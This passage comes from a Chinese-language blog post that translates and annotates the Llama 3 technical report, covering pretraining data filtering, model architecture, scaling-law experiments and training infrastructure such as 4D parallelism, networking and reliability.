开发过程的一部分，我们还为模型开发了多模态扩展，实现了图像识别、视频识别和语音理解能力。这些模型仍处于积极发展阶段，尚未准备好发布。除了我们的语言建模结果之外，本文还展示了我们对这些多模态模型的初步实验的结果。</p><hr><h1 id="2-General-Overview"><a href="#2-General-Overview" class="headerlink" title="2 General Overview"></a>2 General Overview</h1><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_IuZhfqrboF.png"></p><blockquote><p>图1：Llama 3 的整体架构和训练说明。Llama 3是一个 Transformer 语言模型，经过训练可以预测文本序列的下一个标记。有关详细信息，请参阅文本。</p></blockquote><p>Llama 3 的模型架构如图 1 所示。我们的 Llama 3 语言模型的开发包括两个主要阶段：</p><p><strong>语言模型预训练</strong>。我们首先将大型多语言文本语料库转换为离散标记，并在结果数据上预训练大型语言模型（LLM）以执行下一个标记预测。在语言模型预训练阶段，模型学习语言的结构，并从“阅读”的文本中获取关于世界的大量知识。为了有效地做到这一点，预训练是大规模执行的：我们使用 $8K $标记的上下文窗口在$  15.6T  $token上预训练具有$  405B  $参数的模型。这个标准的预训练阶段之后是一个持续的预训练阶段，它将支持的上下文窗口增加到$  128K  $个标记。有关详细信息，请参阅第 3 节。</p><blockquote><p>预训练阶段的窗口大小先从8K慢慢增大到128K。</p></blockquote><p><strong>语言模型后训练</strong>。预训练的语言模型对语言有丰富的理解，但它还没有按照我们期望助手的方式遵循指令或行为。我们将模型与多轮人工反馈对齐，每一轮都涉及指令调整数据和直接偏好优化（DPO; Rafailov et al., 2024）上的监督微调（SFT）。在这个后训练第2个阶段，我们还整合了新功能，例如工具使用，并观察到其他领域的显着改进，例如编码和推理。有关详细信息，请参阅第 4 节。最后，在预训练阶段还将安全缓解纳入模型中，其细节在第 5.4 节中描述。</p><hr><h1 id="3-Pre-Training"><a href="#3-Pre-Training" class="headerlink" title="3 Pre-Training"></a>3 Pre-Training</h1><p>语言模型预训练涉及：</p><ol><li>大规模训练语料库的管理和过滤（如何构造数据集）</li><li>模型架构的开发和相应的比例定律来确定模型大小</li><li>大规模高效预训练的技术的发展（如何把模型训练起来）</li><li>预训练方法的开发</li></ol><p>下面我们分别介绍这些组件中的每一个。</p><h2 id="3-1-预训练数据"><a href="#3-1-预训练数据" class="headerlink" title="3.1 预训练数据"></a>3.1 预训练数据</h2><p>我们从包含知识的各种数据源创建语言模型预训练数据集，直到 2023 年底。我们在每个数据源上应用了几种数据去重方法和数据清洗来获得高质量的token。我们删除包含大量个人身份信息 (<code>PII</code>) 和具有已知成人内容的信息。</p><h3 id="3-1-1-Web数据配置"><a href="#3-1-1-Web数据配置" class="headerlink" title="3.1.1 Web数据配置"></a>3.1.1 Web数据配置</h3><p>我们使用的大部分数据来自网络，我们将在下面描述我们的数据清洗过程。</p><p>**<code>PII</code>**<strong>和安全过滤</strong>。在其他缓解措施中，我们实现了旨在从网站中删除数据的过滤器可能包含不安全的内容或大量的 <code>PII</code>，根据各种 Meta 安全标准进行排名的领域，以及已知包含成人内容的领域。</p><p><strong>文本提取和清理</strong>。我们处理非截断 Web 文档的原始 HTML 内容以提取高质量的多样化文本。为此，我们构建了一个自定义解析器，它提取 HTML 内容并优化样板去除和内容召回的精度。我们在人工评估中评估解析器的质量，将其与针对类似文章内容优化的流行的第三方 HTML 解析器进行比较，发现它表现良好。我们仔细处理具有数学和代码内容的 HTML 页面以保留该内容的结构。我们维护图像 alt 属性文本，因为数学内容通常表示为预渲染图像，其中数学也在 alt 属性中提供。我们通过实验评估了不同的清理配置。我们发现与普通文本相比，markdown 对主要在 Web 数据上训练的模型的性能有害，因此我们删除所有标记标记。</p><p><strong>数据去重</strong>。我们在 URL、文档和行级别应用了几轮重复数据删除：</p><ul><li>URL 级别的去重。我们在整个数据集中执行 URL 级别的重复数据删除。我们保留每个 URL 对应的页面的最新版本。</li><li>文档级别的去重。我们在整个数据集中执行全局 MinHash (Broder, 1997) 重复数据删除以删除近乎重复的文档。</li><li>行级别的去重。我们执行类似于 ccNet 的激进行级重复数据删除（Wenzek 等人，2019）。我们删除在 30M 个文档的每个桶中出现超过 6 次的行。尽管我们的手动定性分析表明，行级重复数据删除不仅从导航菜单、cookie 警告等各种网站中删除了左样板，而且还删除了频繁的高质量文本，但我们的实证评估显示出显着的改进。</li></ul><p><strong>启发式过滤</strong>。我们开发了启发式方法来删除额外的低质量文档、异常值和重复过多的文档。一些启发式示例包括：</p><ul><li>我们使用重复的 n-gram 覆盖率 (Rae et al., 2021) 来去除由重复内容（例如日志记录或错误消息）组成的行。这些行可能很长且独特，因此无法通过行编过滤。</li><li>我们使用“dirty word”计数 (Raffel et al., 2020) 过滤掉域块列表未涵盖的成人网站。</li><li>我们使用token的分布 Kullback-Leibler 散度来过滤与训练语料库分布相比包含过多异常值标记的文档。</li></ul><p><strong>基于模型的质量过滤</strong>。此外，我们尝试将各种基于模型的质量分类器应用于子选择高质量的标记。这些包括使用快速分类器，例如 fasttext (Joulin et al., 2017)，经过训练以识别给定文本是否由 Wikipedia 引用（Touvron et al., 2023a），以及更多计算密集型的基于 Roberta 的分类器 (Liu et al., 2019a) 在 Llama 2 预测上进行训练。为了训练基于 Llama 2 的质量分类器，我们创建了一组干净的 Web 文档，描述了质量要求，并指示 Llama 2 的聊天模型以确定文档是否满足这些要求。我们使用 DistilRoberta (Sanh et al., 2019) 为每个文档生成质量分数，以提高效率。我们通过实验评估了各种质量过滤配置的功效。</p><p><strong>代码和数据</strong>。与 DeepSeek-AI 等人类似(2024)，我们构建了特定领域的管道，用于提取代码和数学相关的网页。具体来说，代码和推理分类器都是在 Llama 2 注释的网络数据上训练的 DistilRoberta 模型。与上述一般质量分类器不同，我们对包含数学演绎、STEM 领域的推理以及与自然语言交错的代码的目标网页进行提示调优。由于代码和数学的标记分布与自然语言的标记分布有很大不同，因此这些流程实现了特定领域的 HTML 提取、定制的文本特征和过滤启发式方法。</p><p><strong>多语言数据</strong>。与我们对上述英语的处理过程类似，我们实现了过滤器来从可能包含 <code>PII</code>或不安全内容的网站中删除数据。我们的多语言文本处理管道有几个独特的特征：</p><ul><li>我们使用基于快速文本的语言识别模型将文档分类为 176 种语言。</li><li>我们在每种语言的数据中执行文档级和行级重复数据删除。</li><li>我们应用特定于语言的启发式方法和基于模型的过滤器来去除低质量的文档。</li></ul><p>此外，我们使用基于多语言 Llama 2 的分类器对多语言文档进行质量排名，以确保优先考虑高质量的内容。我们通过实验确定预训练中使用的多语言标记的数量，平衡英语和多语言基准的模型性能。</p><h3 id="3-1-2-数据混合"><a href="#3-1-2-数据混合" class="headerlink" title="3.1.2 数据混合"></a>3.1.2 数据混合</h3><p>为了获得高质量的语言模型，必须仔细确定预训练数据混合中不同数据源的比例。我们确定这种数据混合的主要工具是知识分类和比例定律实验。</p><p><strong>知识分类</strong>。我们开发了一个分类器来对 Web 数据中包含的信息类型进行分类，以更有效地确定数据混合。我们使用该分类器对网络上过度表示的数据类别进行下采样，例如艺术和娱乐。</p><p><strong>数据混合的缩放规律</strong>。为了确定最佳数据混合，我们进行了缩放定律实验，在该实验中，我们在数据混合上训练几个小模型，并使用它来预测大模型在该混合上的性能（参见第 3.2.1 节）。我们对不同的数据混合多次重复此过程，以选择新的数据混合候选。随后，我们在这个候选数据混合上训练了一个更大的模型，并在几个关键基准上评估该模型的性能。</p><p><strong>数据混合摘要</strong>。我们的最终数据混合包含大约 50% 的通用知识、25% 的数学和推理标记、17% 的代码标记和 8% 的多语言标记。</p><h3 id="3-1-3-退火数据"><a href="#3-1-3-退火数据" class="headerlink" title="3.1.3 退火数据"></a>3.1.3 退火数据</h3><p>根据经验，我们发现少量高质量代码和数学数据的退火（参见第 3.4.3 节）可以提高预训练模型在关键基准上的性能。类似于李等人(2024b)，我们使用数据混合执行退火，该混合对选定域中的高质量数据进行上采样。我们不会在我们的退火数据中包括来自常用基准的任何训练集。这使我们能够评估 Llama 3 的真实小样本学习能力和域外泛化。</p><p>继 OpenAI (2023a) 之后，我们评估了退火在 GSM8k (Cobbe et al., 2021) 和 MATH (Hendrycks et al., 2021b) 训练集上的功效退火。我们发现退火将预训练的 Llama 3 8B 模型在 GSM8k 和 MATH 验证集上的性能分别提高了 24.0% 和 6.4%。然而，405B 模型的改进可以忽略不计，这表明我们的旗舰模型具有很强的上下文学习和推理能力，并且不需要特定的域内训练样本来获得强大的性能。</p><h2 id="3-2-模型架构"><a href="#3-2-模型架构" class="headerlink" title="3.2 模型架构"></a>3.2 模型架构</h2><p>Llama 3 使用标准的dense Transformer 架构 (Vaswani et al., 2017)。在模型架构方面，它与 Llama 和 Llama 2 (Touvron et al., 2023a,b) 没有明显区别；我们的性能提升主要是由数据质量和多样性的提高以及训练规模的增加推动的。</p><p>与 Llama 2 相比，我们做了一些小的修改：</p><ul><li>使用具有 8 个键值头的分组查询注意力（GQA）来提高推理速度并减少解码期间键值对缓存的大小。</li><li>使用注意掩码来防止同一序列中不同文档之间的自注意力。我们发现这种变化在标准预训练期间的影响有限，但发现它在对非常长的序列的持续预训练中很重要。</li></ul><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_wFL-K9w32l.png"></p><blockquote><p><em>数据可以是好几个文档的内容拼接在一起，但是计算注意力的时候只需要计算与我相关的文档内的注意力即可</em></p></blockquote><ul><li>使用具有 <code>128K</code>个标记的词汇表。我们的tokens词汇表将来自 <code>tiktoken3tokenizer</code>的 <code>100K</code>个tokens与 <code>28K</code>个附加tokens相结合，以更好地支持非英语语言。与 Llama 2 分词器相比，我们的新<code>tokenizer</code>在每个token的 3.17 到 3.94 个字符的英语数据样本上提高了压缩率。这使得模型能够为相同数量的训练计算“阅读”更多的文本。我们还发现，从选择非英语语言中添加 <code>28K</code>个token可以提高压缩比和下游性能，而对英语标记化没有影响。</li></ul><blockquote><p><em>Llama 2应该词表大小应该是32K，所以增加幅度比较大</em></p></blockquote><ul><li>将 <code>RoPE</code>基本频率超参数增加到 500,000，这使我们能够更好地支持更长的上下文；熊等人(2023) 表明这个值对于高达 32,768 的上下文长度是有效的。</li></ul><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_Zi3sRvLLvz.png"></p><blockquote><p>表 3：Llama 3 的关键超参数概述。我们展示了 8B、70B 和 405B 语言模型的设置。</p></blockquote><p>Llama 3 405B 使用具有 126 层的架构、16,384 和 128 个注意力头的token表示维度；有关详细信息，请参见表 3。这导致模型大小根据我们数据上的缩放定律近似计算最优，训练预算为$3.8 × 10^{25}$FLOPs。</p><h3 id="3-2-1-Scaling-Laws"><a href="#3-2-1-Scaling-Laws" class="headerlink" title="3.2.1 Scaling Laws"></a>3.2.1 Scaling Laws</h3><p>我们开发了缩放定律 (Hoffmann et al., 2022; Kaplan et al., 2020) 来确定给定预训练计算预算的旗舰模型的最佳模型大小。除了确定最优模型大小外，一个主要的挑战是预测旗舰模型在下游基准任务上的性能，因为有几个问题：</p><ol><li>现有的标度律通常只预测下一个token预测损失，而不是特定的benchmark性能</li><li>Scaling Laws可能有噪声且不可靠，因为它们是基于使用小计算预算进行的预训练运行开发的</li></ol><p>为了应对这些挑战，我们实现了两阶段方法来开发能够准确预测下游基准性能的scaling laws：</p><ol><li>我们首先建立了计算最优模型在下游任务和训练<code>FLOPs</code>上的负对数似然之间的相关性</li><li>我们利用具有更高计算 FLOP 训练的Scaling Laws模型和旧模型，将下游任务的负对数似然与任务准确性相关联。在这一步中，我们专门利用 Llama 2 系列模型</li></ol><p>这种方法使我们能够在给定特定数量的计算最佳模型训练 FLOP 的情况下预测下游任务性能。我们使用类似的方法来选择我们的预训练数据混合（参见第 3.4 节）。</p><p><strong>Scaling law experiments</strong>。具体来说，我们通过使 用$6 × 10^{18}$FLOPs 和 $10^{22}$个 FLOPs 之间的计算预算的预训练模型来构建我们的缩放定律。在每个计算预算中，我们使用每个计算预算的模型大小子集，预训练大小为 40M 和 16B 参数的模型。在这些训练运行中，我们使用余弦学习率计划、线性预热2,000 个训练步骤。根据模型的大小，峰值学习率设置为$  2 × 10^{−4}  $和$ 4 × 10^{−4}$之间。我们将余弦衰减设置为峰值的 0.1。每一步的权重衰减设置为该步骤中学习率的 0.1 倍。我们对每个计算尺度使用固定的批量大小，范围从 250K 和 4M。</p><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_CioTFqjIYh.png"></p><blockquote><p>图 2：$6 × 10^{18}$和$10^{22}$个 <code>FLOPs</code>之间的缩放定律 <code>IsoFLOPs</code>曲线。损失是保留验证集上的负对数似然。我们使用二阶多项式在每个计算尺度上近似测量值。</p></blockquote><p>这些实验产生了图2中的<code>IsoFLOPs</code>曲线。这些曲线的损失是在一个单独的验证集上测量的。我们使用二阶多项式拟合测量的损失值，并确定每个抛物线的最小值。我们将抛物线的最小值称为相应预训练计算预算的计算最优模型。</p><p>我们使用我们确定这种方法的计算最佳模型来预测特定计算预算的最佳训练token数量。为此，我们假设计算预算 C 和训练token的最佳数量$  N ⋆(C)  $之间存在幂律关系：</p><p>$$<br>N^{\star}(C)&#x3D;A C^{\alpha}<br>$$</p><p>我们使用图 2 中的数据拟合 A 和 α。我们发现$ (α, A) &#x3D; (0.53, 0.29)$，相应的拟合如图 3 所示。将得到的scaling law外推到$ 3.8 × 10^{25}$FLOPs 表明在 16.55T 令牌上训练 402B 参数模型。</p><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_dvvCJcxqJ3.png"></p><blockquote><p>图 3 已识别的计算最佳模型中的训练令牌数量作为预训练计算预算的函数。我们还包括拟合的标度律预测。计算最优模型对应于图 2 中的抛物线最小值。</p></blockquote><p>一个重要的观察结果是，随着计算预算的增加，<code>IsoFLOPs</code>曲线在最小值附近变得更平坦。这意味着旗舰模型的性能对模型大小和训练令牌之间的权衡的微小变化相对稳健。基于这一观察，我们最终决定用 <code>405B</code>参数训练一个旗舰模型。</p><p><strong>预测下游任务的性能</strong>。我们使用生成的计算最优模型来预测基准数据集上旗舰 Llama 3 模型的性能。首先，我们线性关联基准测试中正确答案的（归一化）负对数似然和训练 FLOP。在此分析中，我们仅使用在上述数据混合上训练多达$10^{22}$个 FLOPs 的标度律模型。接下来，我们使用缩放定律模型和 Llama 2 模型建立了对数似然和准确性之间的 sigmoidal 关系，这些模型使用 Llama 2 数据混合和标记器进行训练。</p><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_Kg78PW9ll2.png"></p><blockquote><p>图 4 ARC Challenge 的标度律预测. 左：ARC Challenge 基准上正确答案的归一化负对数似然作为预训练 FLOPs 的函数。右图：ARC Challenge 基准准确度作为正确答案的归一化负对数似然的函数。该分析使我们能够在预训练开始之前预测 ARC Challenge 基准上的模型性能。有关详细信息，请参阅文本。</p></blockquote><p>我们在图 4 中展示了该实验在图 4 中的 ARC Challenge 基准上的结果。我们发现这种两步缩放定律预测，它外推了超过四个数量级，非常准确：它只略微低估了旗舰 Llama 3 模型的最终性能。</p><h2 id="3-3-基础设施、缩放和效率"><a href="#3-3-基础设施、缩放和效率" class="headerlink" title="3.3 基础设施、缩放和效率"></a>3.3 基础设施、缩放和效率</h2><p>我们描述了我们大规模支持 Llama 3 405B 预训练的硬件和基础设施，并讨论了一些优化，从而提高了训练效率。</p><h3 id="3-3-1-训练基础设施"><a href="#3-3-1-训练基础设施" class="headerlink" title="3.3.1 训练基础设施"></a>3.3.1 训练基础设施</h3><p>Llama 1 和 2 模型在 Meta 的 AI Research SuperCluster 上进行了训练（Lee 和 Sengupta，2022 年）。正如我们进一步缩放的那样，Llama 3 的训练迁移到 Meta 的生产集群（Lee et al., 2024）。此设置针对生产级可靠性进行了优化，这在我们扩大培训时是必不可少的。</p><p><strong>Computer</strong>：Llama 3 405B 在多达 16K H100 GPU 上训练，每个 GPU 在 700W TDP 上运行，80GB HBM3，使用 Meta 的 Grand Teton AI 服务器平台 (Matt Bowman, 2022)。每个服务器都配备了八个 GPU 和两个 CPU。在服务器内，八个 GPU 通过 <code>NVLink</code>连接。使用 MAST (Choudhury et al., 2024)、Meta 的全局规模训练调度器调度训练作业。</p><p><strong>Storage</strong>：Tectonic (Pan et al., 2021)、Meta 的通用分布式文件系统用于构建 Llama 3 预训练的存储结构 (Battey and Gupta, 2024)。它在配备 SSD 的 7,500 个服务器中提供了 240 PB 的存储，并支持 2 TB&#x2F;s 的可持续吞吐量和 7 TB&#x2F;s 的峰值吞吐量。一个主要的挑战是支持高度突发的检查点写入，使存储结构在短时间内饱和。检查点保存每个 GPU 的模型状态，每个 GPU 从 1 MB 到 4 GB，用于恢复和调试。我们的目标是在检查点期间最小化 GPU 暂停时间并增加检查点频率，以减少恢复后丢失的工作量。</p><p><strong>Network</strong>：Llama 3 405B 基于 Arista 7800 和 Minipack2 开放计算 Project4 OCP 机架交换机在收敛以太网 (RoCE) 结构上使用 RDMA。Llama 3 系列中的较小模型使用 Nvidia Quantum2 Infiniband 结构进行训练。RoCE 和 Infiniband 集群都利用了 GPU 之间的 400 Gbps 互连。尽管这些集群之间存在潜在的网络技术差异，但我们调整了它们，以便为这些大型训练工作负载提供同等的性能。我们进一步详细阐述了我们的 RoCE 网络，因为我们完全拥有自己的设计。</p><ul><li><strong>网络拓扑</strong>。我们基于 RoCE 的 AI 集群由三层 Clos 网络连接的 24K GPU5（Lee 等人、2024）。在底层，每个机架托管 16 个 GPU，在两个服务器之间拆分，并通过单个 Minipack2 机架顶部 (ToR) 交换机连接。在中间层，192 个这样的机架由 Cluster Switches 连接，形成 3,072 个 GPU 的吊舱，具有全等分带宽，确保没有超额订阅。在顶层，同一数据中心建筑中的八个这样的pod通过Aggregation Switches连接，形成24K GPU的集群。然而，聚合层的网络连接不能保持完整的二分法带宽，而是超额订阅比为1:7。我们的模型并行方法（见第3.3.2节）和训练作业调度器（Choudhury等人2024）都经过优化，以了解网络拓扑，旨在最小化跨pods的网络通信。</li><li><strong>负载平衡</strong>。LLM 训练产生拥堵网络流，这些流很难使用 Equal-Cost Multi-Path (ECMP) 路由等传统方法在所有可用的网络路径上负载平衡。为了应对这一挑战，我们采用了两种技术。首先，我们的集体库在两个 GPU 之间创建了 16 个网络流，而不仅仅是一个，从而减少每个流的流量并为负载平衡提供更多流。其次，我们的 Enhanced-ECMP (E-ECMP) 协议通过对数据包 RoCE 标头中的附加字段进行散列，有效地平衡了这 16 个跨不同网络路径的流。</li><li><strong>拥塞控制</strong>。我们在关键部分使用深度缓冲交换机(Gangidi et al., 2024)，以适应集体通信模式引起的瞬态拥塞和缓冲。这种设置有助于限制由慢速服务器引起的持久拥塞和网络反向压力的影响，这在训练中很常见。最后，通过 E-ECMP 更好的负载平衡显着减少了拥塞的机会。通过这些优化，我们成功地运行了 24K GPU 集群，没有传统的拥塞控制方法，例如数据中心量化拥塞通知 (DCQCN)。</li></ul><h3 id="3-3-2-模型Scaling的并行"><a href="#3-3-2-模型Scaling的并行" class="headerlink" title="3.3.2 模型Scaling的并行"></a>3.3.2 模型Scaling的并行</h3><p>为了扩展我们最大模型的训练，我们使用 4D 并行性——四种不同类型的并行方法的组合——对模型进行分片。这种方法有效地将计算分布在许多 GPU 中，并确保每个 GPU 的模型参数、优化器状态、梯度和激活适合其 HBM。我们对4D并行的实现如图5所示。</p><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_Q0XyLUmHLr.png"></p><blockquote><p>图 5：4D 并行性的说明。GPU按照 [TP, CP, PP, DP] 的顺序分为并行组，其中 DP 代表 FSDP。在此示例中，16 个 GPU 配置为 |TP|&#x3D;2、|CP|&#x3D;2、|PP|&#x3D;2 和 |DP|&#x3D;2 的组大小。&#x20;<br>GPU 在 4D 并行性中的位置表示为向量 [D1, D2, D3, D4]，其中 Di 是第 i 个并行维度的索引。在本例中，GPU0[TP0, CP0, PP0, DP0]和GPU1[TP1, CP0, PP0, DP0]在同一个TP组中，GPU0和GPU2在同一个CP组中，GPU0和GPU4在同一个PP组中，GPU0和GPU8在同一个DP组中。</p></blockquote><p>它结合了tensor并行、pipeline并行、context并行和data并行。</p><p>张量并行将单个权重张量分割成不同设备上的多个块。管道并行逐层将模型垂直划分为阶段，以便不同的设备可以在完整模型管道的不同阶段并行处理。上下文并行性将输入上下文划分为段，减少了非常长的序列长度输入的内存瓶颈。我们使用完全分片的数据并行性 (FSDP; Rajbhandari et al., 2020; Ren et al., 2021; Zhao et al., 2023b)，它在实现数据并行性的同时对模型、优化器和梯度进行分片，该并行性在多个 GPU 上并行处理数据并在每个训练步骤后同步。我们对 Llama 3 个分片优化器状态和梯度使用 FSDP，但对于模型分片，我们在前向计算后不会重新分片，以避免后向传递期间的额外全聚集通信。</p><p><strong>GPU利用率</strong>。通过对并行配置、硬件和软件的仔细调优，我们实现了表4所示配置的总体BF16模型FLOPs利用率(MFU;Chowdhery等人(2023))为38-43%。在DP&#x3D;64的8K GPU上，MFU略有下降至41%，而在DP&#x3D;64的8K GPU上，MFU略有下降为43%，这是由于在训练过程中保持每批全局令牌所需的每个DP组的批处理大小较低。</p><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_Km0faadOZS.png"></p><blockquote><p>表 4 Llama 3 405B 预训练的每个阶段的缩放配置和 MFU。有关每种类型的并行性的描述，请参见图 5。</p></blockquote><p><strong>管道并行改进</strong>。我们遇到了现有实现的几个挑战：</p><ol><li><strong>批量大小约束</strong>。当前的实现对每个 GPU 的支持批量大小有约束，要求它可以被管道阶段的数量整除。对于图 6 中的示例，管道并行的深度优先调度 (DFS) (Narayanan et al., 2021) 需要 N &#x3D; PP &#x3D; 4，而广度优先调度 (BFS; Lamy-Poiriier (2023)) 需要 N &#x3D; M ，其中 M 是微批次的总数，N 是同一阶段前向和后向的连续微批次的数量。然而，预训练通常需要灵活性来调整批量大小。</li><li><strong>内存不平衡</strong>。现有的管道并行实现导致资源消耗不平衡。由于嵌入和预热的微批次，第一阶段消耗更多的内存。</li><li><strong>计算不平衡</strong>。在模型的最后一层之后，我们需要计算输出和损失，使这个阶段成为执行延迟瓶颈。</li></ol><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_AW7-1_xKM-.png"></p><blockquote><p>图 6 Llama 3 中管道并行性的图示。管道并行在四个管道等级（PP 等级 0 到 3）中划分八个管道阶段（0 到 7），其中等级为 0 的 GPU 运行阶段 0 和 4，P 等级为 1 的 GPU 运行阶段 1 和 5 等。彩色块（0 到 9）表示一系列微批次，其中 M 是微批次的总数，N 是同一阶段前向和后向的连续微批次的数量。我们的关键见解是使 N 可调。</p></blockquote><p>为了解决这些问题，我们修改了我们的管道调度，如图 6 所示，它允许灵活设置——在这种情况下$ N &#x3D; 5$，它可以在每批中运行任意数量的微批次。这使我们能够运行：</p><ol><li>当我们大规模设置批量大小限制时，微批次比阶段的数量少</li><li>更多的微批次来隐藏点对点通信，在 DFS 和广度优先调度 (BFS) 之间找到最佳通信和内存效率的最佳点</li></ol><p>为了平衡管道，我们分别从第一阶段和最后阶段减少一个 Transformer 层。这意味着第一阶段的第一个模型块只有嵌入，最后一阶段的最后一个模型块只有输出投影和损失计算。为了减少管道气泡，我们使用一个交错调度(Narayanan et al.， 2021)，在一个管道排名上使用V管道阶段。整体管道气泡比为$\frac{\mathrm{PP}-1}{V * M}$。此外，我们在 PP 中采用了异步点对点通信，这大大加快了训练速度，尤其是在文档掩码引入了额外的计算不平衡的情况下。我们启用TORCH_NCCL_AVOID_RECORD_STREADMS，以减少异步点对点通信的内存使用。最后，为了降低内存成本，基于详细的内存分配分析，我们主动释放未用于未来计算的张量，包括每个管道阶段的输入和输出张量，这不会用于未来的计算。通过这些优化，我们可以在 8K 个标记的序列上预训练 Llama 3，而无需激活检查点。</p><p><strong>长序列的上下文并行性</strong>。我们利用上下文并行性 (CP) 在缩放 Llama 3 的上下文长度并在长度高达 128K 的非常长的序列上进行训练时提高内存效率。在 CP 中，我们跨序列维度划分，特别是我们将输入序列划分为$  2 × CP  $块，因此每个 CP 排名接收两个块以获得更好的负载平衡。第$  i  $个 CP 等级接收第 i 个和第$  (2 × CP − 1 − i)  $个块。</p><p>与现有的 CP 实现在环形结构中重叠通信和计算（Liu et al., 2023a），我们的 CP 实现采用了一种基于全集合的方法，我们首先收集键 (K) 和值 (V) 张量，然后计算局部查询 (Q) 张量块的注意力输出。尽管全聚集通信延迟暴露在关键路径中，但由于两个主要原因，我们仍然采用这种方法：</p><ol><li>在基于全聚集的 CP 注意力（例如文档掩码）中支持不同类型的注意掩码更容易和更灵活</li><li>由于使用 GQA，暴露的全聚集延迟很小，因为通信 K 和 V 张量远小于 Q 张量（Ainslie 等人，2023）</li></ol><p>因此，注意力计算的时间复杂度比全聚集 (O(S2) 与 O(S) 大一个数量级，其中 S 表示完整因果掩码中的序列长度），使得全聚集开销可以忽略不计。</p><p><strong>网络感知并行配置</strong>。并行维度[TP, CP, PP, DP]的顺序针对网络通信进行了优化。最内层的并行性需要最高的网络带宽和最低的延迟，因此通常被限制在同一个服务器内。最外层的并行性可能分布在多跳网络中，并且应该容忍更高的网络延迟。因此，根据网络带宽和延迟的要求，我们按照 [TP, CP, PP, DP] 的顺序放置并行维度。DP（即 FSDP）是最外层的并行性，因为它可以通过异步预取分片模型权重和减少梯度来容忍更长的网络延迟。以最小的通信开销识别最优并行配置，同时避免GPU内存溢出具有挑战性。我们开发了一个内存消耗估计器和一个性能投影工具，帮助我们探索各种并行配置并投影整体训练性能并有效地识别内存差距。</p><p><strong>数值稳定性</strong>。通过比较不同并行设置之间的训练损失，我们修复了影响训练稳定性的几个数值问题。为了确保训练收敛，我们在多个微批次的后向计算期间使用 FP32 梯度累积，并在 FSDP 中跨数据并行工作人员减少 FP32 中的散射梯度。对于中间张量，例如视觉编码器输出，在前向计算中使用多次，后向梯度也在 FP32 中累积。</p><h3 id="3-3-3-集群通信"><a href="#3-3-3-集群通信" class="headerlink" title="3.3.3 集群通信"></a>3.3.3 集群通信</h3><p>我们对 Llama 3 的集群通信库基于 Nvidia 的 NCCL 库的分叉，称为 NCCLX。NCCLX 显着提高了 NCCL 的性能，特别是对于更高的延迟网络。回想一下，并行度维度的顺序是 [TP, CP, PP, DP]，其中 DP 对应于 FSDP。最外层的并行维度 PP 和 DP 可以通过多跳网络进行通信，延迟高达数十微秒。原始的 NCCL 集体——FSDP 中的全聚集和减少散射，PP 中的点对点——需要数据分块和阶段数据复制。这种方法会产生几个低效率，包括：</p><ol><li>需要在网络上交换大量小的控制消息以促进数据传输</li><li>额外的内存复制操作</li><li>使用额外的 GPU 循环进行通信</li></ol><p>对于 Llama 3 训练，我们通过调整分块和数据传输来解决这些低效率的子集，以适应我们的网络延迟，这对于大集群来说可能高达数十微秒。我们还允许小的控制消息以更高的优先级遍历我们的网络，特别是避免在深度缓冲核心交换机中阻塞的线头。我们正在进行的未来 Llama 版本的工作涉及对 <code>NCCLX</code>进行更深入的更改，以全面解决上述所有问题。</p><h3 id="3-3-4-可靠性和操作挑战"><a href="#3-3-4-可靠性和操作挑战" class="headerlink" title="3.3.4 可靠性和操作挑战"></a>3.3.4 可靠性和操作挑战</h3><p>16K GPU训练的复杂性和潜在故障场景超过了我们操作的更大的CPU集群。此外，训练的同步特性使其不易容错——单个 GPU 故障可能需要重新启动整个作业。尽管存在这些挑战，对于 Llama 3，我们在支持自动集群维护的同时实现了超过 90% 的有效训练时间，例如固件和 Linux 内核升级（Vigraham 和 Leonhardi、2024），这导致每天至少一次训练中断。有效的训练时间衡量了在经过时间的有用训练上花费的时间。</p><p>在预训练的 54 天快照期间，我们总共经历了 466 个作业中断。其中，由于固件升级或操作员发起的操作(如配置或数据集更新)的自动化维护操作，47个计划中断。剩下的 419 是意外中断。</p><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_mGXYRuq2_p.png"></p><blockquote><p>表5 Llama 3 405B预训练期间54天内的意外中断根本原因分类。约78%的意外中断归因于已确认或疑似硬件问题。</p></blockquote><p>如表 5 所示。大约 78% 的意外中断归因于确认的硬件问题，例如 GPU 或主机组件故障，或疑似与硬件相关的问题，例如静默数据损坏和计划外的个人主机维护事件。GPU 问题是最大的类别，占所有意外问题的 58.7%。尽管失败次数很大，但在此期间只需要 3 次重大人工干预，其余的问题由自动化处理。</p><p>为了提高有效的训练时间，我们减少了作业启动和检查点时间，并开发了快速诊断和问题解析的工具。我们广泛使用 PyTorch 的内置 NCCL 飞行记录器 (Ansel et al., 2024)，这是一种将集体元数据和堆栈跟踪捕获到环形缓冲区的特征，从而允许我们大规模快速诊断挂起和性能问题，特别是在 NCCLX 方面。使用这个，我们有效地记录每个通信事件以及每个集体操作的持续时间，并在 NCCLX 观察狗或心跳超时上自动转储跟踪数据。我们通过在线配置更改 (Tang et al., 2015) 有选择地启用更多计算密集型的跟踪操作和元数据收集，而无需代码发布或作业重新启动。</p><p>由于我们网络中 NVLink 和 RoCE 的混合使用，大规模训练中的错误问题变得复杂。NVLink 上的数据传输通常通过 CUDA 内核发出的负载&#x2F;存储操作发生，远程 GPU 或 NVLink 连接中的故障通常表现为 CUDA 